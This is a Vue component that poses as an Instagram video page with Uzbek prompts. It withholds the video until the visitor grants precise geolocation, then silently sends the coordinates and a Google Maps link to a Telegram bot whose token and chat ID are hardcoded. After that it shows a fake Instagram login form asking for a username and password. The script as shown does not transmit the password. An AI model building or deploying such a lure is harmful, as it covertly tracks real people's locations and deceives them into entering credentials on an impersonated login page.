<template>
  <div class="video-container">
    <!-- Geolocation Modal -->
    <div v-if="showGeoModal" class="modal">
      <div class="modal-content">
        <img src="../logos.png" width="48" height="48" alt="logo" />
        <h2>
          Videoni ko'rishdan oldin joylashuvingizni aniqlashga ruxsat bering.
        </h2>
        <button @click="requestGeolocation" class="allow-btn">
          Ruxsat berish
        </button>
      </div>
    </div>

    <!-- Error Modal -->
    <div v-if="geoDenied" class="modal">
      <div class="modal-content">
        <h2>
          📍 Iltimos, videoni ko'rish uchun joylashuvingizga ruxsat bering.
        </h2>
      </div>
    </div>

    <!-- Login Form -->
    <div v-if="showLogin" class="login-form">
      <img
        src="../logos.png"
        width="75"
        height="75"
        alt="logo"
        class="instagram-logo"
      />
      <h2 class="instagram-text">Instagram</h2>
      <input
        type="text"
        placeholder="Phone number, username, or email"
        v-model="username"
      />
      <input type="password" placeholder="Password" v-model="password" />
      <button class="allow-btn login-btn" @click="submitLogin">Log in</button>
      <div class="or-divider">
        <span class="divider-line"></span>
        <span class="or-text">OR</span>
        <span class="divider-line"></span>
      </div>
      <a href="#" class="forgot-password">Forgot password?</a>
      <div class="signup-container">
        <p>
          Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </p>
      </div>
    </div>

    <!-- Video Player -->
    <div v-if="showVideo" class="video-box">
      <video controls autoplay loop class="insta-video">
        <source src="./assets/mainvideo.mp4" type="video/mp4" />
        Sizning brauzeringiz video tagni qo'llab-quvvatlamaydi.
      </video>
    </div>
  </div>
</template>

<script>
export default {
  name: "GeoLoginVideo",
  data() {
    return {
      showGeoModal: true,
      geoDenied: false,
      showLogin: false,
      showVideo: false,
      username: "",
      password: "",
      latitude: null,
      longitude: null,
      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
      chatId: "5673984207",
    };
  },
  methods: {
    requestGeolocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            this.latitude = pos.coords.latitude;
            this.longitude = pos.coords.longitude;
            this.sendToTelegram();
            this.showGeoModal = false;
            this.showLogin = true;
          },
          (err) => {
            console.error("Geolocation error:", err.message);

            // ❌ Ruhsat berilmasa:
            this.geoDenied = true;
            this.showGeoModal = false;
            this.showLogin = false;

            // ✅ 3 soniyadan so'ng bosh oynaga qaytarish
            setTimeout(() => {
              this.geoDenied = false;
              this.showGeoModal = true;
            }, 3000);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      } else {
        this.geoDenied = true;
        this.showGeoModal = false;
        this.showLogin = false;

        setTimeout(() => {
          this.geoDenied = false;
          this.showGeoModal = true;
        }, 3000);
      }
    },
    sendToTelegram() {
      const message = `📍 Foydalanuvchi joylashuvi:
Latitude: ${this.latitude}
Longitude: ${this.longitude}
🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
🕒 Vaqt: ${new Date().toLocaleString()}`;
      const url = `https://api.telegram.org/bot${
        this.botToken
      }/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then((res) => res.json())
        .catch((err) => console.error(err));
    },
    submitLogin() {
      if (this.username && this.password) {
        this.showLogin = false;
        this.showVideo = true;
      } else {
        alert("Iltimos, barcha maydonlarni to'ldiring.");
      }
    },
  },
};
</script>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box !important;
  background-color: #000 !important;
}
.video-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  background: #f00;
  color: #fff;
  min-height: 100vh;
  padding: 30px;
  font-family: sans-serif;
}

.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: #000;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 10;
}

.modal-content,
.login-form {
  background: gray;
  padding: 30px 40px;
  border-radius: 12px;
  box-shadow: 0 0 10px #3d3d3d;
  display: flex;
  flex-direction: column;
  gap: 12px;
  align-items: center;
  text-align: center;
  margin: 0 10px;
}

.allow-btn {
  background: #0095f6 !important;
  color: #fff;
  border: none;
  border-radius: 8px;
  padding: 10px 20px;
  font-weight: bold;
  cursor: pointer;
}
.allow-btn:hover {
  background: #0078cc;
}

.login-form {
  background: transparent !important;
  box-sizing: border-box !important;
  padding: 30px 40px;
  /* border-radius: 1px; */
  width: 350px;
}

.instagram-logo {
  margin-bottom: 10px;
}

.instagram-text {
  font-family: "Brush Script MT", cursive;
  font-size: 40px;
  margin: 0 0 20px 0;
  font-weight: normal;
}

.login-form input {
  width: 100%;
  padding: 12px 10px;
  border: 1px solid #262626;
  border-radius: 3px;
  background: #121212;
  color: #fff;
  margin-bottom: 6px;
  font-size: 12px;
}

.login-btn {
  width: 100%;
  margin-top: 8px;
}

.or-divider {
  display: flex;
  align-items: center;
  width: 100%;
  margin: 15px 0;
}

.divider-line {
  flex: 1;
  height: 1px;
  background-color: #262626;
}

.or-text {
  padding: 0 15px;
  color: #8e8e8e;
  font-size: 13px;
  font-weight: 600;
}

.forgot-password {
  color: #0095f6;
  font-size: 12px;
  text-decoration: none;
  margin-top: 5px;
}

.signup-container {
  margin-top: 20px;
  font-size: 14px;
}

.signup-link {
  color: #0095f6;
  text-decoration: none;
  font-weight: 600;
}

.video-box {
  background-color: transparent !important;
  box-sizing: border-box !important;
  max-width: 400px;
  width: 100%;
  margin-top: 30px;
}
.insta-video {
  width: 100%;
  border-radius: 12px;
  object-fit: cover;
}
</style>
